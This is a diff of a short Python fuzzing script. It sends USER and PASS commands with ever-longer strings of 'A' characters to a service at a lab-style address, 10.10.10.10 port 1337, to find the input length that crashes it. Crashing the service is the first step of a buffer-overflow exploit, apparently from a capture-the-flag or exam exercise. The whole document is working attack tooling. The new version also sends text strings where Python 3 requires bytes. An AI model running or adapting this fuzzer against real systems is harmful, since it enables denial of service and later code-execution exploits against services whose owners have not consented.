@@ -1,26 +1,32 @@
-#!/usr/bin/env python3
-
 import socket, time, sys
 
 ip = "10.10.10.10"
-
 port = 1337
 timeout = 5
-prefix = "OVERFLOW1 "
 
-string = prefix + "A" * 100
+# Create an array of increasing length buffer strings.
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
 
-while True:
-  try:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-      s.settimeout(timeout)
-      s.connect((ip, port))
-      s.recv(1024)
-      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
-      s.send(bytes(string, "latin-1"))
-      s.recv(1024)
-  except:
-    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
-    sys.exit(0)
-  string += 100 * "A"
-  time.sleep(1)
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        connect = s.connect((ip, port))
+        s.recv(1024)
+        s.send("USER username\r\n")
+        s.recv(1024)
+
+        print("Fuzzing PASS with %s bytes" % len(string))
+        s.send("PASS " + string + "\r\n")
+        s.recv(1024)
+        s.send("QUIT\r\n")
+        s.recv(1024)
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
